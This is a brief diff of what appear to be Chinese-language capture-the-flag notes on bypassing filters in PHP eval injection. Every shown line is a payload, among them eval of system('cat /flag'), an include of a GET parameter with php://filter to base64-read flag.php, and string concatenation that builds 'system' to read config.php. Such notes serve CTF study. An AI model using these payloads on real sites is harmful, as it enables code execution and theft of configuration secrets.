@@ -14,6 +14,7 @@ eval('system('cat /flag')?> ');    // 分号可以用?>替换。 且后面代码
 eval('eval($_GET[a])?>')  
 
 /?c=include"$_GET[a]"?>&a=php://filter/read=convert.base64-encode/resource=flag.php //过滤了(
+/?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php //过滤了( 双引号"
 
 eval("$x='sys';  $y='tem';  $z=$x.$y;  $z('cat config.php');" );         //绕过过滤。
 
